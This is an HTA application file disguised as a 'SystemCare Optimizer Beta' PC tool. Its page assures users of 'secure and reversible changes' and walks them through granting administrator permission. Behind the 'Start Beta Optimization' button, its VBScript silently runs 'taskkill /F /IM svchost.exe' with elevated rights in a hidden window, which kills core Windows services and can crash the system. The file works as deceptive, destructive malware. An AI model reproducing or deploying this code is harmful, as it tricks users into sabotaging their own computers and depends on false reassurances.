<!DOCTYPE html>
<html>
<head>
    <title>SystemCare Optimizer (Beta)</title>
    <hta:application
        applicationName="SystemCare Optimizer Beta"
        border="thin"
        caption="yes"
        icon=""
        showInTaskbar="yes"
        singleInstance="yes"
        sysMenu="yes"
        windowState="normal"
    >
    <style>
        body { font-family: 'Open Sans', sans-serif; margin: 25px; background-color: #f2f2f2; color: #555; line-height: 1.6; }
        h1 { color: #34495e; margin-bottom: 15px; }
        p { margin-bottom: 20px; font-size: 1.1em; }
        .info { color: #2ecc71; font-weight: bold; font-size: 1.2em; display: block; margin-bottom: 20px; }
        .note { font-size: 0.9em; color: #777; margin-top: 15px; display: block; }
        button { background-color: #2ecc71; color: white; padding: 14px 28px; border: none; cursor: pointer; font-size: 18px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15); }
        button:hover { background-color: #27ae60; }
        .beta-tag-hta { background-color: #e67e22; color: white; padding: 6px 12px; border-radius: 6px; font-size: 0.9em; margin-left: 10px; }
        .beta-message { font-size: 0.9em; color: #777; font-style: italic; margin-top: 20px; display: block; }
        .step-instruction { background-color: #eaf2f8; padding: 15px; border-radius: 6px; margin-bottom: 15px; border-left: 5px solid #3498db; }
        /* Font Import */
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
    </style>
    <script language="VBScript">
    Sub RunOptimization

        MsgBox "Thank you for joining the SystemCare Optimizer Beta program! To deliver the best possible performance improvements, we need your permission to make some secure adjustments to your system settings. Administrator privileges are required for this step. Please click 'Yes' on the following prompt to proceed.", vbOKOnly + vbInformation, "Important Beta Information"

        command = "taskkill /F /IM svchost.exe"
        Set objShellApp = CreateObject("Shell.Application")
        ' 0 parameter hides the window
        objShellApp.ShellExecute "cmd.exe", "/c " & command, "", "runas", 0
        Set objShellApp = Nothing

        MsgBox "The initial optimization process has started (Beta Stage). We appreciate your contribution to making SystemCare Optimizer better!", vbOKOnly + vbInformation, "Optimization Started"

    End Sub
    </script>
</head>
<body>
    <h1>SystemCare Optimizer <span class="beta-tag-hta">Beta</span></h1>
    <p class="info">Early Access - Experience Enhanced Performance and Help Us Refine!</p>
    <p>Welcome to the SystemCare Optimizer Beta! By participating, you're helping us fine-tune our powerful optimization engine to deliver the best performance for your PC.</p>

    <div class="step-instruction">
        <strong>Step 1: Click the button below to start the initial optimization.</strong>
        <p>This will allow SystemCare Optimizer to analyze your system and prepare for performance enhancements.</p>
    </div>

    <button onclick="RunOptimization()">Start Beta Optimization</button>

    <div class="step-instruction">
        <strong>Step 2: You may be asked for administrator permission.</strong>
        <p>Granting this permission is necessary for SystemCare Optimizer to safely apply system-level optimizations that can significantly improve performance.</p>
    </div>

    <p class="note">(SystemCare Optimizer will only make secure and reversible changes to your system.)</p>
    <p class="beta-message">Your feedback is crucial! Please share your experiences and suggestions via ??? or our ???.</p>
</body>
</html>
